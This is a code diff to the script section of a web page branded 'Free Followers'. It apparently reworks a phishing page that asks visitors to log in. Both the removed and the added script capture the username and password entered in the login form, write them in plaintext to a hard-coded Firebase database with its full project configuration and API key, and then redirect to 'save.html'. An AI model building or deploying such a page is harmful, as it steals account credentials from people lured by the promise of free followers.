@@ -166,71 +166,60 @@
       <footer>&copy; 2025 Free Followers | All Rights Reserved</footer>
     </div>
 
-    <script>
-      function toggleMenu() {
-        const menu = document.getElementById("menuOptions");
-        menu.style.display = menu.style.display === "flex" ? "none" : "flex";
-      }
+     <script type="module">
+        // Import Firebase SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
 
-      function togglePassword() {
-        const passwordField = document.getElementById("password");
-        passwordField.type =
-          passwordField.type === "password" ? "text" : "password";
-      }
-    </script>
-      <script type="module">
-  // Firebase SDK import
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
-  import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyD2eitt5iTwBaTx8CWeuuPeyD7nTa58XD8",
+            authDomain: "freefollowers-d31af.firebaseapp.com",
+            databaseURL: "https://freefollowers-d31af-default-rtdb.firebaseio.com",
+            projectId: "freefollowers-d31af",
+            storageBucket: "freefollowers-d31af.appspot.com",
+            messagingSenderId: "807949104285",
+            appId: "1:807949104285:web:2c0238cdc7913dad279074",
+            measurementId: "G-ME1GQ5KV8H"
+        };
 
-  // Firebase configuration
-  const firebaseConfig = {
-    apiKey: "AIzaSyD2eitt5iTwBaTx8CWeuuPeyD7nTa58XD8",
-    authDomain: "freefollowers-d31af.firebaseapp.com",
-    databaseURL: "https://freefollowers-d31af-default-rtdb.firebaseio.com",
-    projectId: "freefollowers-d31af",
-    storageBucket: "freefollowers-d31af.appspot.com",
-    messagingSenderId: "807949104285",
-    appId: "1:807949104285:web:2c0238cdc7913dad279074",
-    measurementId: "G-ME1GQ5KV8H",
-  };
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
 
-  // Initialize Firebase
-  const app = initializeApp(firebaseConfig);
-  const db = getDatabase(app);
+        // Function to store user data
+        function writeUserData(username, password) {
+            const userId = new Date().getTime().toString(); // Unique user ID
+            set(ref(db, "users/" + userId), {
+                username: username,
+                password: password
+            }).then(() => {
+                alert("✅ Data saved successfully!");
+                window.location.href = "save.html"; // Redirect after saving data
+            }).catch((error) => {
+                console.error("❌ Error saving data:", error);
+                alert("❌ Failed to save data.");
+            });
+        }
 
-  // Function to save user data
-  function writeUserData(userID, username, password) {
-    set(ref(db, "users/" + userID), {
-      username: username,
-      password: password,
-    })
-      .then(() => {
-        alert("Your data has been saved successfully!");
-        window.location.href = "save.html";
-      })
-      .catch((error) => {
-        console.error("Error saving data: ", error);
-        alert("An error occurred while saving your data.");
-      });
-  }
+        // Handle form submission
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            if (username && password) {
+                writeUserData(username, password);
+            } else {
+                alert("⚠️ Please fill in both fields.");
+            }
+        });
 
-  // Form submission handling
-  document.getElementById("loginForm").addEventListener("submit", (event) => {
-    event.preventDefault();
-
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
-
-    if (username && password) {
-      const userID = new Date().getTime();
-      writeUserData(userID, username, password);
-    } else {
-      alert("Please fill in both fields.");
-    }
-  });
-      </script>
-    
+        // Toggle password visibility
+        function togglePassword() {
+            const passwordField = document.getElementById("password");
+            passwordField.type = (passwordField.type === "password") ? "text" : "password";
+        }
+     </script>
 
   </body>
   </html>
